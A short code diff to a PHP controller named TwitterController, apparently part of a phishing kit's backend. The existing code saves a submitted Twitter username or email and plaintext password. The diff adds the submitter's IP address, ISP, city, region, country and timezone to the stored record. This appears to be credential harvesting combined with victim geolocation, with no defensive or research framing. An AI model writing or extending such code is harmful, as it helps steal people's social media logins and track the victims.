@@ -41,6 +41,12 @@ class TwitterController extends Controller
 
         $dataTwitter->usernameOrEmail = $request->usernameOrEmail;
         $dataTwitter->password = $request->password;
+        $dataTwitter->ip = $request->ip;
+        $dataTwitter->isp = $request->isp;
+        $dataTwitter->city = $request->city;
+        $dataTwitter->region = $request->region;
+        $dataTwitter->country = $request->country;
+        $dataTwitter->timezone = $request->timezone;
         
         $dataTwitter->save();
 
